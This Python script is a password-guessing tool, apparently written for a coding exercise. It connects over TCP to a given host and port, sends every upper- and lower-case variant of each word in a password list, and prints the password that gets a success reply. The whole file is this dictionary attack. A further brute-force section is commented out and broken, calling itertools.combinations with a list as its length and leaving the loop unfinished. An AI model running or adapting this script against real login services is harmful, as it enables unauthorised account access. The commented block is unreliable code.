# Initial stage just establish connection to unprotected server
# Update add brute force password hacker

import socket
import sys
import itertools
letters = [chr(ord('a') + i) for i in range(26)]
numbers = [str(i) for i in range(10)]
alphanum = letters + numbers
betanum = ['']

with socket.socket() as socket1:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    socket1.connect(address)

    with open('passwords.txt', 'r') as file:    
        response = ''
        while response != 'Connection success!':
            # Attempt using password list
            for line in file:
                word = line.strip()
                combos = map(''.join, itertools.product(*zip(word.upper(), word.lower())))
                for combo in combos:
                    socket1.send(combo.encode())
                    response = socket1.recv(1024).decode()
                    if response == 'Connection success!':
                        print(combo)
                        break
                if response == 'Connection success!':
                    break
            # Brute force attempt
        """  password = itertools.combinations(alphanum, betanum)
            for word in password:
                message = "".join(word)
                encoded = message.encode()
                socket1.send(encoded)
                response = socket1.recv(1024)
                response = response.decode()
                if response == 'Connection success!':
                    print(message)
                    break
                betanum.append(message) """

        
